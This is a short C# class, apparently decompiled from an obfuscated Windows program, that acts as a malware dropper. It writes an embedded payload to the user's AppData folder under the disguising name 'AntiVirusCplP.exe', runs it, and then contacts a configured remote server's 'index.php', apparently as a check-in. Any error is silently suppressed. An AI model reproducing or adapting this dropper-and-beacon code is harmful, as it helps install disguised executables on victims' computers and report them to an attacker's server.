using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using Microsoft.VisualBasic.CompilerServices;
using ns0;
using ns5;

namespace ns2;

internal class Class14
{
	public static void smethod_0()
	{
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\AntiVirusCplP.exe"))
			{
				File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\AntiVirusCplP.exe", Class18.smethod_15());
				Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\AntiVirusCplP.exe");
				WebClient webClient = new WebClient();
				webClient.DownloadData(Class1.smethod_2().method_0().string_2 + "index.php");
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
